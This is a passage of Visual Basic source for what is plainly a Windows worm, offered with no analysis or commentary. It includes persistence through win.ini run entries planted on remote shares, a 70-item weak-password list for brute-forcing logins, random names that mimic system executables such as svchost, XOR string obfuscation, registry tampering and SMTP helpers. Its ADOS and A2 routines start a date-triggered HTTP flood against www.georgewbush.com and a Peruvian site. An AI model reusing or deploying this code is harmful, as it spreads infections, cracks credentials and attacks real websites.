    If LCase(Left(dW, 3)) = "win" Then

     If InStr(dW, ".") = 0 Then

     SA vL & dW & "\win.ini", 0
     WIni "windows", "run", vL & "\" & R, vL & "\" & dW & "\win.ini"

     End If

    End If

   dW = Dir()
   Loop

   DeConecIp (vL)
   End Sub

   Public Function Cred()
   'OK
   On Error Resume Next: Dim U(1 To 70) As String
   U(1) = "%null%": U(2) = "%username%": U(3) = "%username%12": U(4) = "%username%123"
   U(5) = "%username%1234": U(6) = "123": U(7) = "1234": U(8) = "12345"
   U(9) = "123456": U(10) = "1234567": U(11) = "12345678": U(12) = "654321"
   U(13) = "54321": U(14) = "1": U(15) = "111": U(16) = "11111"
   U(17) = "111111": U(18) = "11111111": U(19) = "000000": U(20) = "00000000"
   U(21) = "pass": U(22) = "5201314": U(23) = "88888888": U(24) = "888888"
   U(25) = "passwd": U(26) = "password": U(27) = "sql": U(28) = "database"
   U(29) = "admin": U(30) = "test": U(31) = "server": U(32) = "computer"
   U(33) = "secret": U(34) = "oracle": U(35) = "sybase": U(36) = "root"
   U(37) = "Internet": U(38) = "super": U(39) = "user": U(40) = "manager"
   U(41) = "security": U(42) = "public": U(43) = "private": U(44) = "default"
   U(45) = "1234qwer": U(46) = "123qwe": U(47) = "abcd": U(48) = "abc123"
   U(53) = "123abc": U(54) = "abc": U(55) = "123asd": U(56) = "asdf"
   U(57) = "asdfgh": U(58) = "!@#$": U(59) = "!@#$%": U(60) = "!@#$%^"
   U(61) = "!@#$%^&": U(62) = "!@#$%^&*": U(63) = "!@#$%^&*(": U(64) = "!@#$%^&*()"
   U(65) = "intel": U(66) = "": U(67) = vbCrLf: U(68) = "KKKKKKK": U(69) = "09876"
   U(70) = "": Cred = U()
   End Function

   Public Function GLD() As String
   'OK
   On Error Resume Next
   NextGLD:
   Dim gL As String
   Randomize
   gL = Chr(Int(Rnd * 20) + 71)
   If Fdx(gL & ":\") Then GoTo NextGLD
   GLD = gL & ":"
   End Function

   Public Function GetRndIP()
   'OK
   On Error Resume Next
   Dim rIP As Integer
   Randomize

   For i = 0 To 3
   rIP = Int(Rnd * 255) + 1
   GetRndIP = GetRndIP & "." & rIP
   Next

   GetRndIP = Mid(GetRndIP, 2)
   End Function

   Public Function GetLclIP()
   'OK
   On Error Resume Next
   If Not (StartWinsock()) Then Call EndWinsock: Exit Function

   Dim hostname As String * 256, hostent_addr As Long
   Dim Host As HostEnt, hostip_addr As Long, temp_ip_address() As Byte
   Dim i As Integer, ip_address() As String, x As Integer

   If gethostname(hostname, 256) = -1 Then
   Exit Function
   Else
   hostname = Trim$(hostname)
   End If

   hostent_addr = gethostbyname(hostname)

   If hostent_addr = 0 Then Exit Function

   MemCopy Host, hostent_addr, LenB(Host)

   MemCopy hostip_addr, Host.h_addr_list, 4

   ReDim ip_address(5)

   Do
   ReDim temp_ip_address(1 To Host.h_length)
   MemCopy temp_ip_address(1), hostip_addr, Host.h_length

   For i = 1 To Host.h_length
   ip_address(x) = ip_address(x) & "." & temp_ip_address(i)
   Next

   ip_address(x) = Mid$(ip_address(x), 2)

   Host.h_addr_list = Host.h_addr_list + LenB(Host.h_addr_list)
   MemCopy hostip_addr, Host.h_addr_list, 4
   x = x + 1
   Loop While (hostip_addr <> 0)

   ReDim Preserve ip_address(x - 1)

   GetLclIP = ip_address()

   Call EndWinsock
   End Function

   Public Function GetComputerNameEx()
   'OK
   On Error Resume Next: Dim sBuffer As String, lBufSize As Long, lStatus As Long
   lBufSize = 255: sBuffer = String$(lBufSize, " "): lStatus = GetComputerName(sBuffer, lBufSize)
   If lStatus <> 0 Then GetComputerNameEx = Left(sBuffer, lBufSize)
   End Function

   Public Function GetUser()
   'OK
   On Error Resume Next: Dim lpUserID As String, nBuffer As Long, ret As Long
   lpUserID = String(25, 0): nBuffer = 25: ret = GetUserName(lpUserID, nBuffer)
   If ret Then GetUser = Left(lpUserID, nBuffer)
   End Function

   Public Function PaisID()
   'OK
   On Error Resume Next: Dim sBuf As String
   LCID = GetSystemDefaultLangID(): sBuf = Space$(255)
   Call GetLocaleInfo(LCID, &H6, sBuf, Len(sBuf))
   PaisID = Trim$(sBuf)
   End Function

   Public Function LangID() As String
   'OK
   On Error Resume Next
   Dim sBuf As String * 255, l As Long
   LCID = GetSystemDefaultLangID()
   l = GetLocaleInfo(LCID, &H4, sBuf, Len(sBuf))
   LangID = Left(sBuf, l)
   End Function
   Public Function gShP(Path) As String
   'OK
   On Error Resume Next
   Dim shp As String, l As Long
   shp = Space$(255)
   l = GetShortPathName(Path, shp, Len(shp))
   gShP = Left$(shp, l)
   End Function

   Public Function GetWinVersion() As Long
   'OK
   On Error Resume Next
   Dim OSinfo As OSVERSIONINFO
       With OSinfo
           .dwOSVersionInfoSize = 148
           .szCSDVersion = Space$(128)
           Call GetVersionExA(OSinfo)
        GetWinVersion = .dwPlatformId
       End With
   End Function

   Public Function q(j) As String
   'OK
   On Error Resume Next: For R = 1 To Len(j): q = q & Chr(Asc(Mid(j, R, 1)) Xor 7): Next
   End Function

   Public Function Flx(Path) As Boolean
   'OK
   On Error Resume Next
   If Len(Path) < 4 Then Flx = False: Exit Function
   Flx = IIf(Dir(Path, vbArchive + vbHidden + vbNormal + vbReadOnly + vbSystem) <> "", True, False)
   End Function

   Public Function Fdx(Path) As Boolean
   'OK
   On Error Resume Next
   If Len(Path) = 0 Then Fdx = False: Exit Function
   If Right(Path, 1) <> "\" Then Path = Path & "\"
   Fdx = IIf(Dir(Path, vbDirectory + vbNormal + vbReadOnly + vbSystem) <> "", True, False)
   End Function

   Function Sp(x As Integer)
   'OK
   On Error Resume Next
   Dim l As Long, spath As String

   Select Case x

   Case 0
   spath = Space$(255): l = GetWindowsDirectory(spath, 255): Sp = Left(spath, l)

   Case 1
   spath = Space$(255): l = GetSystemDirectory(spath, 255): Sp = Left(spath, l)

   Case 2
   spath = Space$(255): l = GetTempPath(255, spath): Sp = Left(spath, l - 1)

   Case 3
   spath = App.Path
   If Right(spath, 1) <> "\" Then spath = spath & "\"
   Ex = Array(".exe", ".scr", ".pif", ".com", ".bat")
   For i = 0 To UBound(Ex)
   If Flx(spath & App.EXEName & Ex(i)) Then
   Sp = spath & App.EXEName & Ex(i)
   Exit For
   End If
   Next

   End Select
   End Function

   Public Function RndName() As String
   'OK
   On Error Resume Next
   Dim RI(4) As Integer

   pre = Array("win", "acc", "asd", "un", "char", "ctv", "reg", _
   "serv", "clip", "cd", "dos", "free", "micro", "grp", "hw", _
   "ip", "is", "net", "xp", "w2k")

   bod = Array("command", "load", "rundl", "setup", "install", _
   "calc", "defrag", "aplog", "cln", "player", "explorer", _
   "wiek", "zq", "ftp", "groups", "mixer", "Uninst", "route", _
   "svchost", "twtour")

   suf = Array("32", "upd", "stat", "arp", "38", "map", "brd", _
   "rep", "drv", "386", "info", "nl", "040a", "img", "503", _
   "mon", "set", "lib", "dll", "unst")

   est = Array(".exe", ".com", ".pif", ".bat", ".scr")

   Randomize
   RI(0) = Int(Rnd * 20): RI(1) = Int(Rnd * 20): RI(2) = Int(Rnd * 20): RI(3) = Int(Rnd * 5)

   RndName = UCase(pre(RI(0)) & bod(RI(2)) & suf(RI(1)) & est(RI(3)))
   End Function

   Public Sub SA(P, a As Integer)
   'OK
   On Error Resume Next: SetAttr P, a
   End Sub

   Public Sub Rw(sKey, nKey, vKey As Variant, m0, m1)
   'OK
   On Error Resume Next
   Dim RK As Long, l As Long, hKey As Long

   Select Case m0
   Case 1
   RK = HKEY_CLASSES_ROOT
   Case 2
   RK = HKEY_CURRENT_USER
   Case 3
   RK = HKEY_LOCAL_MACHINE
   End Select

   l = RegCreateKeyEx(RK, sKey, 0&, vbNullString, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, 0&, hKey, l)

   Select Case m1
   Case 1
   Dim sVal As String
    sVal = vKey
    l = RegSetValueEx(hKey, nKey, 0&, REG_SZ, ByVal sVal, Len(sVal) + 1)
   Case 2
   Dim lVal As Long
   lVal = vKey
    l = RegSetValueEx(hKey, nKey, 0&, REG_DWORD, lVal, 4)
   Case 3
   Dim sVale As String
    sVale = vKey
    l = RegSetValueEx(hKey, nKey, 0&, REG_EXPAND_SZ, ByVal sVale, Len(sVale) + 1)
   End Select

   l = RegCloseKey(hKey)
   End Sub

   Public Sub Rd(sKey, nKey, m)
   'OK
   On Error Resume Next

   Dim RK As Long, l As Long, hKey As Long

   Select Case m
   Case 1
   RK = HKEY_CLASSES_ROOT
   Case 2
   RK = HKEY_CURRENT_USER
   Case 3
   RK = HKEY_LOCAL_MACHINE
   End Select

   l = RegOpenKeyEx(RK, sKey, 0, KEY_ALL_ACCESS, hKey)
    l = RegDeleteValue(hKey, nKey)
   l = RegCloseKey(hKey)
   End Sub

   Public Function Rr(sKey, nKey, m)
   'OK
   On Error Resume Next
   Dim RK As Long, l As Long, hKey As Long, ky As Long, fKey As String

   Select Case m
   Case 1
   RK = HKEY_CLASSES_ROOT
   Case 2
   RK = HKEY_CURRENT_USER
   Case 3
   RK = HKEY_LOCAL_MACHINE
   End Select

   l = RegOpenKeyEx(RK, sKey, 0, KEY_QUERY_VALUE, hKey)

     l = RegQueryValueEx(hKey, nKey, 0&, REG_SZ, 0&, ky)

   fKey = String(ky, Chr(32))

   If l <= 2 Then Rr = "": Exit Function

     l = RegQueryValueEx(hKey, nKey, 0&, REG_SZ, ByVal fKey, ky)

   fKey = Left$(fKey, ky - 1)

   l = RegCloseKey(hKey)

   Rr = fKey
   End Function

   Public Sub WIni(I_S As String, IK As String, IV As String, ip As String)
   'OK
   On Error Resume Next: Dim Wn As Long
   Wn = WritePrivateProfileString(I_S, IK, IV, ip)
   End Sub

   'OK
   Public Function FrFile(): On Error Resume Next: FrFile = FreeFile: End Function

   Public Function iStat() As Boolean
   'OK
   On Error Resume Next
   iStat = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
   End Function

   Public Function StartWinsock() As Boolean
   'OK
   On Error Resume Next
   Dim StartupData As WSADATAType
   StartWinsock = IIf(WSAStartup(&H101, StartupData) = 0, True, False)
   End Function

   Public Sub EndWinsock()
   'OK
   On Error Resume Next
   Dim l As Long
   If WSAIsBlocking() Then l = WSACancelBlockingCall()
   l = WSACleanup()
   End Sub

   Public Sub ADOS()
   'OK
   On Error Resume Next
   If Day(Date) < 25 Then
   End
   End If

   Do
   DoEvents
   If (Minute(Time) Mod 10) = 0 Then
   If iStat() Then A2 Else Sleep 60000
   End If
   Loop
   End Sub

   Public Sub A2()
   'OK
   On Error Resume Next
   Dim aSock As Long, f As Integer
   Do
   If Not (StartWinsock()) Or Not (iStat()) Then Call EndWinsock: Exit Sub
   DoEvents
   Randomize: f = Int(Rnd * 2) + 1
   If f = 1 Then
   aSock = ConnectSock("www.georgewbush.com", Form1.hWnd, 80, 1, 1080)
   ElseIf f = 2 Then
   aSock = ConnectSock("www.fujimoriextraditable.com.pe", Form1.hWnd, 80, 1, 1080)
   End If
   Sleep 2000
   If f = 1 Then
   Call SendData(aSock, GetHTTP("www.georgewbush.com") & vbCrLf)
   ElseIf f = 2 Then
   Call SendData(aSock, GetHTTP("www.fujimoriextraditable.com.pe") & vbCrLf)
   End If
   Sleep 3000
   closesocket (aSock)
   Loop
   Call EndWinsock
   End Sub

   Function GetHostByNameAlias(ByVal hostname) As Long
   'OK
   On Error Resume Next
   Dim rgn As Long, addrList As Long, rIP As Long, getHost As HostEnt

   rIP = inet_addr(hostname)

   If rIP = INADDR_NONE Then
    rgn = gethostbyname(hostname)
     If rgn <> 0 Then
       MemCopy getHost, ByVal rgn, hostent_size
       MemCopy addrList, ByVal getHost.h_addr_list, 4
       MemCopy rIP, ByVal addrList, getHost.h_length
       Else
       rIP = INADDR_NONE
     End If
   End If

   GetHostByNameAlias = rIP
   End Function

   Public Function ConnectSock(ByVal Host As String, ByVal HWndToMsg As Long, port As Long, m As Integer, nmsg As Long) As Long
   'OK
   On Error Resume Next
   Dim s As Long, SelectOps As Long, sockin As sockaddr

   sockin.sin_family = AF_INET
   sockin.sin_port = htons(port)

   If sockin.sin_port = INVALID_SOCKET Then: ConnectSock = INVALID_SOCKET: Exit Function

   sockin.sin_addr = GetHostByNameAlias(Host)

   If sockin.sin_addr = INADDR_NONE Then ConnectSock = INVALID_SOCKET: Exit Function

   s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)

   If s < 0 Then ConnectSock = INVALID_SOCKET: Exit Function

   If SetSockLinger(s, 1, 0) = SOCKET_ERROR Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
   End If

   If m = 1 Then
    SelectOps = FD_READ Or FD_CONNECT Or FD_CLOSE

    If WSAAsyncSelect(s, HWndToMsg, ByVal nmsg, ByVal SelectOps) Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
    End If

    If connect(s, sockin, sockaddr_size) <> SOCKET_ERROR Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
    End If

   Else

    If connect(s, sockin, sockaddr_size) = SOCKET_ERROR Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
    End If

   End If

   ConnectSock = s
   End Function

   Public Function SetSockLinger(ByVal SockNum As Long, ByVal OnOff As Integer, ByVal LingerTime As Integer) As Long
   'OK
   On Error Resume Next

   Dim Linger As LingerType
    Linger.l_onoff = OnOff
    Linger.l_linger = LingerTime

   If setsockopt(SockNum, SOL_SOCKET, SO_LINGER, Linger, 4) <> 0 Then
   SetSockLinger = SOCKET_ERROR
   Else

   If getsockopt(SockNum, SOL_SOCKET, SO_LINGER, Linger, 4) <> 0 Then
   SetSockLinger = SOCKET_ERROR
   End If

   End If
   End Function

   Public Function SendData(ByVal s As Long, vMessage As Variant) As Long
   'OK
   On Error Resume Next
   Dim TheMsg() As Byte
               TheMsg = StrConv(vMessage, vbFromUnicode)
   If UBound(TheMsg) > -1 Then
       SendData = send(s, TheMsg(0), (UBound(TheMsg) - LBound(TheMsg) + 1), 0)
   End If
   End Function

   Function GetHTTP(URL)
   'OK
   On Error Resume Next
   Randomize
   GetHTTP = "GET / HTTP/1.1" & vbCrLf
   Ar1 = Array("image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, application/x-shockwave-flash, */*", "*/*")
   GetHTTP = GetHTTP & "Accept: " & Ar1(Int(Rnd * (UBound(Ar1) + 1))) & vbCrLf
   Ar2 = Array("es-mx", "de", "ca", "pl", "en", "en-us", "en-gb", "fr", "nl", "ja", "es-es", "es", "es-ar", "es-co")
   GetHTTP = GetHTTP & "Accept-Language: " & Ar2(Int(Rnd * (UBound(Ar2) + 1))) & vbCrLf
   Ar3 = Array("gzip", "gzip, deflate")
   GetHTTP = GetHTTP & "Accept-Encoding: " & Ar3(Int(Rnd * (UBound(Ar3) + 1))) & vbCrLf
   Ar4 = Array("Mozilla/4.0 (", " Mozilla/4.4 (", "Mozilla/5.0 (", "Mozilla/4.8 (", "Mozilla/2.0 (", "Mozilla/3.0 (", "Opera/6.05 (", "Opera/6.03 (", "Opera/7.20 (")
   Ar5 = Array("compatible; MSIE 6.0; ", "compatible; MSIE 5.01; ", "compatible; MSIE 5.0; ", "Windows; U; ", "compatible; MSIE 5.21; ", "Macintosh; U; ", "compatible; Konqueror/3; ", "Windows XP; ", "Windows 98; ", "Windows 2000; ", "Windows NT 5.0; ", "Windows NT 5.1; ", "Linux 2.4.18-4GB i686; ", "compatible; MSIE 3.0; ", "compatible; StarOffice/5.2; ")
   Ar6 = Array("Windows 98)", "Windows XP)", "Windows 98; Win 9x 4.90)", "Windows NT 5.1)", "Windows NT 5.0)", "Windows 95)", "WinNT4.0)", "Mac_PowerPC)", "PPC)", "Linux)", "U) [de]", "U) [pl]", "U) [es]", "U) [en]", "U) [fr]", "Windows 3.1)", "Win32)")
   GetHTTP = GetHTTP & "UserAgent: " & Ar4(Int(Rnd * (UBound(Ar4) + 1))) & Ar5(Int(Rnd * (UBound(Ar5) + 1))) & Ar6(Int(Rnd * (UBound(Ar6) + 1))) & vbCrLf
   Ar7 = Array(URL & ":80", URL)
   GetHTTP = GetHTTP & "Host: " & Ar7(Int(Rnd * (UBound(Ar7) + 1))) & vbCrLf
   End Function

   Public Function Hook(ByVal hWnd As Long)
   'OK
       On Error Resume Next: lpPrevWndProc = SetWindowLong(hWnd, GWL_WNDPROC, AddressOf WindowProc)
   End Function

   Public Function UnHook(ByVal hWnd As Long)
   'OK
       On Error Resume Next: Call SetWindowLong(hWnd, GWL_WNDPROC, lpPrevWndProc)
   End Function

   Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   'OK
   On Error Resume Next

   Dim x As Long, a As String, ReadBuffer(1000) As Byte, e_err
   Select Case uMsg

    Case 1025
    e_err = WSAGetAsyncError(lParam)
    If e_err <> 0 Then do_cancel = True

      Select Case lParam
       Case FD_READ
       x = recv(mysock, ReadBuffer(0), 1000, 0)
       If x > 0 Then
       a = StrConv(ReadBuffer, vbUnicode): rtncode = Val(Mid(a, 1, 3))
        Select Case rtncode
        Case 550, 551, 552, 553, 554, 451, 452, 500: do_cancel = True
        End Select
       End If

    Case FD_CONNECT
    mysock = wParam: Progress = Progress + 1

    Case FD_CLOSE
    Call closesocket(mysock)

    End Select
    End Select

       WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
   End Function

   Public Function WSAGetAsyncError(ByVal lParam As Long) As Integer
   'OK
   On Error Resume Next: WSAGetAsyncError = (lParam And &HFFFF0000) \ &H10000
   End Function

   Public Function bSmtpProgress(b As Long) As Boolean
   'OK
   On Error Resume Next
   Dim TimeOut As Variant
   TimeOut = Timer + 60
   While Progress <> b
           DoEvents
           If do_cancel = True Then
           Call closesocket(mysock): mysock = 0
           bSmtpProgress = False
               Exit Function
           End If

           If Timer > TimeOut Then
               Call closesocket(mysock): mysock = 0
               bSmtpProgress = False
               Exit Function
           End If
   Wend
   bSmtpProgress = True
   End Function

   Public Function bSmtpProgress1(b As Long) As Boolean
   'OK
   On Error Resume Next
   Dim TimeOut As Variant
   TimeOut = Timer + 180
   While rtncode <> b
           DoEvents
           If do_cancel = True Then
           Call closesocket(mysock): mysock = 0
           bSmtpProgress1 = False
               Exit Function
           End If

           If Timer > TimeOut Then
               Call closesocket(mysock): mysock = 0
               bSmtpProgress1 = False
               Exit Function
           End If
   Wend
   rtncode = 0
   bSmtpProgress1 = True
   End Function
